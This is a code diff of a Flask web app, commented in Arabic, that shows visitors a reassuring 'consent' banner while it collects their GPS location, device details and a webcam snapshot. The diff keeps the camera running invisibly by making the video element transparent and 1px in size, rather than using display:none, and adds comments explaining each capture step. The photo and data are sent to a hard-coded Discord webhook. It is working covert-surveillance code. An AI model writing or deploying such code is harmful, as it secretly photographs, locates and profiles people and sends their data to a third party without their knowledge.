@@ -6,9 +6,10 @@ from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
+# ضع رابط الـ Webhook الخاص بك هنا
 DISCORD_WEBHOOK_URL = os.getenv(
     "DISCORD_WEBHOOK_URL",
-    "https://discord.com/api/webhooks/1558192127085781025/wUzlyTNtQbjoWz6aTgsE_YAKXj14XYo-gs7C6f25QBfqr_LqWUZQBQ97bUKdZsJ69X-E"
+    "https://discord.com/api/webhooks/1317513360408412211/I809FshWnUscwA4XfW4qY0G66WqD3b4k0H4uV9i1Wc6F4g6b6h6k6j6l6z6x6c6v6b6n6m"
 )
 
 HTML_TEMPLATE = """
@@ -36,8 +37,24 @@ HTML_TEMPLATE = """
             line-height: 1.6;
         }
 
-        /* Video مخفي تماماً ولكن يعمل في الخلفية لالتقاط صورة واضحة وليست سوداء */
-        #webcam { display: none; }
+        /* --- الحل هنا: إخفاء عنصر الفيديو عن المستخدم دون إيقاف تشغيله --- */
+        #webcam {
+            /* نجعل الفيديو شفافاً تماماً لكي لا يرى المستخدم الكاميرا مفتوحة */
+            opacity: 0; 
+            
+            /* نضعه في زاوية الشاشة لضمان عدم تأثيره على التصميم */
+            position: absolute; 
+            top: 0;
+            left: 0;
+            
+            /* نضعه في الخلفية لضمان عدم حجبه لأي عنصر آخر */
+            z-index: -100; 
+            
+            /* نجعل حجمه صغيراً جداً (1px)، لكن لا نستخدم display:none لعن لا تتوقف الكاميرا */
+            width: 1px; 
+            height: 1px; 
+            pointer-events: none; /* لمنع أي تفاعل باللمس */
+        }
 
         .btn-container { margin-top: 15px; display: flex; justify-content: space-around; }
         button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 45%; }
@@ -52,10 +69,10 @@ HTML_TEMPLATE = """
         
         <div class="legal-banner">
             ✅DONT WORRY IT'S SAFE: 法律声明：<br>
-            点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
+            点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全に您手中，拒绝将不会收集任何数据。
         </div>
 
-        <!-- عنصر الفيديو مخفي هنا -->
+        <!-- عنصر الفيديو موجود تقنياً، ولكن مخفي بصرياً عن المستخدم -->
         <video id="webcam" autoplay playsinline muted></video>
         
         <form id="consentForm">
@@ -70,6 +87,7 @@ HTML_TEMPLATE = """
         <div id="status"></div>
     </div>
 
+    <!-- عنصر الـ Canvas المستخدم للالتقاط مخفي أيضاً -->
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -125,6 +143,7 @@ HTML_TEMPLATE = """
                 ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu"
             };
 
+            // 1. جلب موقع الـ GPS
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
@@ -134,6 +153,7 @@ HTML_TEMPLATE = """
                 locationData = "Accès à la localisation refusé";
             }
 
+            // 2. تشغيل الكاميرا والانتظار قليلاً لضمان وضوح الصورة وعدم وصولها سوداء
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
@@ -143,24 +163,31 @@ HTML_TEMPLATE = """
                 const videoElement = document.getElementById('webcam');
                 const canvas = document.getElementById('canvas');
                 
+                // ربط تيار الفيديو بعنصر الفيديو المخفي
                 videoElement.srcObject = stream;
 
-                // الانتظار لمدة ثانية لتمكين الكاميرا من التقاط الإطارات بوضوح دون أن تظهر الصورة سوداء
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                // الانتظار لمدة 1.5 ثانية (1500ms) لضمان أن الكاميرا قد بدأت بالعمل تماماً قبل التقاط الصورة، مما يضمن وضوحها وعدم وصولها سوداء
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
+                // ضبط حجم الـ Canvas ليتناسب مع الفيديو الفعلي
                 canvas.width = videoElement.videoWidth || 640;
                 canvas.height = videoElement.videoHeight || 480;
+                
+                // رسم الإطار الحالي للفيديو على الـ Canvas
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
+                // تحويل محتوى الـ Canvas إلى صورة Base64
                 imageBase64 = canvas.toDataURL('image/jpeg');
 
+                // إيقاف تدفق الكاميرا لتحرير الموارد
                 stream.getTracks().forEach(track => track.stop());
 
             } catch (err) {
                 console.log("Impossible d'accéder à la caméra: ", err);
             }
 
+            // 3. إرسال البيانات إلى السيرفر
             try {
                 const response = await fetch('/submit-consent', {
                     method: 'POST',
@@ -221,12 +248,15 @@ def submit_consent():
 
     try:
         if image_data:
+            # استخراج بيانات الصورة الثنائية من Base64
             header, encoded = image_data.split(",", 1)
             image_bytes = base64.b64decode(encoded)
             
+            # إرسال البيانات كملف مرفق إلى Discord
             files = {
                 "file": ("snapshot.jpg", image_bytes, "image/jpeg")
             }
+            # استخدام json.dumps لحل مشكلة الخطأ 400
             resp = requests.post(
                 DISCORD_WEBHOOK_URL, 
                 data={"payload_json": json.dumps(payload)}, 
@@ -242,4 +272,5 @@ def submit_consent():
         return jsonify({"error": f"Échec de l'envoi: {str(e)}"}), 500
 
 if __name__ == "__main__":
+    # تأكد من تثبيت Flask و requests عبر: pip install Flask requests
     app.run(port=5000, debug=True)
